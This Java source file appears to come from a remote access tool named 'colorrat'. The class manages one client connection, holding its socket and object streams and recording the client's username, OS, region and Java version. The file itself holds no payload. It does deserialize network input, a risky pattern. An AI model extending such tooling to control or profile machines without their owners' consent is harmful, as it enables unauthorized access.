package eu.aragonapp.colorrat.network;

import eu.aragonapp.colorrat.ColorServer;
import eu.aragonapp.colorrat.network.listener.Listener;
import eu.aragonapp.colorrat.network.packet.Packet;
import eu.aragonapp.colorrat.network.thread.types.ReceiveThread;

import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.net.Socket;
import java.util.List;
import java.util.UUID;

/**
 * @Copyright (c) 2018 Mythic Inc. (http://www.mythic.com/) All Rights Reserved.
 * <p>
 * Mythic Inc. licenses this file to you under the Apache License,
 * @Version 2.0 (the "License"); you may not use this file except
 * in compliance with the License.
 * You may obtain a copy of the License at
 * @https://www.apache.org/licenses/LICENSE-2.0
 */
public class NetworkConnection implements Serializable {

    private final ObjectOutputStream outputStream;
    private final ObjectInputStream inputStream;

    private String username, os, region, javaVersion;

    private final Listener listener;
    private final Socket socket;
    private final String uid;

    public NetworkConnection(Socket socket, Listener listener, ObjectOutputStream outputStream, ObjectInputStream inputStream) {
        this.listener = listener;
        this.socket = socket;

        this.uid = UUID.randomUUID().toString().split("-")[0];

        this.outputStream = outputStream;
        this.inputStream = inputStream;
    }

    public boolean write(Packet packet) {
        try {
            this.outputStream.writeObject(packet);
            this.outputStream.flush();
            return true;
        } catch (Exception ex) {
            return false;
        }
    }

    public void stop() {
        try {
            this.outputStream.close();
            this.inputStream.close();
            this.socket.close();
        } catch (Exception ex) {
            ex.printStackTrace();
        }
        ColorServer.getInstance().getClients().remove(this);
    }

    public void setJavaVersion(String javaVersion) {
        this.javaVersion = javaVersion;
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public ObjectInputStream getInputStream() {
        return inputStream;
    }

    public void setRegion(String region) {
        this.region = region;
    }

    public Listener getListener() {
        return this.listener;
    }

    public String getUsername() {
        return this.username;
    }

    public void setOs(String os) {
        this.os = os;
    }

    public Socket getSocket() {
        return socket;
    }

    public String getUid() {
        return this.uid;
    }

    public String getOs() {
        return this.os;
    }

}
